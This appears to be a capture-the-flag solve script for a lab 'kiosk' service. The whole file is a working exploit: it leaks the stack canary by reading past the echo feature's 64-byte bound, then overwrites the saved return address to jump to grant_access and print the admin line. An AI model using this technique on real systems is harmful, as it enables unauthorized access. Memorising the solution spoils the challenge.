"""Leak the stack canary through the echo feature's unenforced 0-64 bound,
then overwrite the greet buffer's saved return address with grant_access's
real address; see solve/README.md for how the two offsets were found.
"""
import socket
import struct
import sys

HOST, PORT = 'app', 9200
PROMPT1 = '몇 바이트를 돌려받을까요 (0-64)? '.encode()
PROMPT2 = '이름을 입력하세요: '.encode()
ECHO_LEN = 120          # past the documented 64-byte bound, covers the canary
NAME_TO_CANARY = 72     # filler before the greet buffer reaches the canary
GRANT_ACCESS = 0x4011B6  # files/kiosk: `nm files/kiosk | grep grant_access`


def read_exact(sock, size):
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    return data


def main():
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(10)
        sock.sendall(f'{ECHO_LEN}\n'.encode())
        total = len(PROMPT1) + ECHO_LEN + 1 + len(PROMPT2)
        response = read_exact(sock, total)
        if len(response) != total or response[:len(PROMPT1)] != PROMPT1:
            print('echo request was rejected before the canary could leak: ' + repr(response), file=sys.stderr)
            raise SystemExit(3)
        raw = response[len(PROMPT1):len(PROMPT1) + ECHO_LEN]
        canary = raw[104:112]

        payload = b'A' * NAME_TO_CANARY + canary + b'B' * 8 + struct.pack('<Q', GRANT_ACCESS)
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)

        out = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
    text = out.decode('utf-8', 'replace')
    for line in text.splitlines():
        if line.startswith('관리자 전용: '):
            print(line.split(': ', 1)[1].strip())
            return
    print('grant_access was not reached: ' + text, file=sys.stderr)
    raise SystemExit(3)


if __name__ == '__main__':
    main()
